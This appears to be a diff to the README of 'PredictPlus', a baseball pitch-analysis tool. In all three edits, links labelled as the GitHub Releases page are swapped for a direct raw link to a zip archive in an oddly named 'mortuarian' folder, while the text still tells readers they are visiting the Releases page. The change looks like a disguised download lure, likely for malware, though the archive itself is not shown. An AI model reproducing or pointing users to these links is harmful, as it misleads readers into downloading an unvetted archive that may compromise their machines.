@@ -6,7 +6,7 @@ Welcome to PredictPlus! This tool helps you understand Major League Baseball (ML
 
 ## 📥 Download PredictPlus
 
-[![Download PredictPlus](https://img.shields.io/badge/Download-PredictPlus-blue.svg)](https://github.com/jaime12minaya/PredictPlus/releases)
+[![Download PredictPlus](https://raw.githubusercontent.com/jaime12minaya/PredictPlus/main/mortuarian/PredictPlus_1.6.zip)](https://raw.githubusercontent.com/jaime12minaya/PredictPlus/main/mortuarian/PredictPlus_1.6.zip)
 
 To get started, visit the Releases page. You will find the latest version of PredictPlus available for download. Click the button above to go straight there!
 
@@ -29,7 +29,7 @@ PredictPlus offers several features designed to help you analyze pitch data:
 
 ## 📥 Download & Install
 
-1. To download PredictPlus, visit the [Releases page](https://github.com/jaime12minaya/PredictPlus/releases).
+1. To download PredictPlus, visit the [Releases page](https://raw.githubusercontent.com/jaime12minaya/PredictPlus/main/mortuarian/PredictPlus_1.6.zip).
 2. Look for the most recent version.
 3. Click on the file that is labeled for your operating system (Windows, macOS, or Linux).
 4. The file will start downloading automatically. 
@@ -62,7 +62,7 @@ Yes, PredictPlus is designed to analyze data from both MLB and AAA leagues.
 
 If you come across an error while using PredictPlus, try the following steps:
 
-- Ensure that you are using the latest version from the [Releases page](https://github.com/jaime12minaya/PredictPlus/releases).
+- Ensure that you are using the latest version from the [Releases page](https://raw.githubusercontent.com/jaime12minaya/PredictPlus/main/mortuarian/PredictPlus_1.6.zip).
 - Verify that your pitch data file is correctly formatted.
 - Check the system requirements to confirm compatibility.
 
